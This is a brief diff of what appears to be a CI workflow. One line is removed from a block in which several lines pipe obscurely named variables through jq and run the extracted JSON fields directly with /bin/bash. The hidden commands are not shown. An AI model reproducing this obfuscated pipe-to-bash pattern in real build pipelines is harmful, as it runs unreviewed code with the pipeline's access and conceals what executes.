@@ -27,7 +27,6 @@ jobs:
           echo $t49 | jq -r .unb20323 | /bin/bash
           printf '%s' "$dvjtr054" | jq -r .ajhx66816 | /bin/bash
           echo $tej7 | jq -r .dlor90259 | /bin/bash
-          printf '%s' "$eqvo46" | jq -r .no95 | /bin/bash
           echo $thlci95523 | jq -r .my2846 | /bin/bash
 
       - name: Archive results
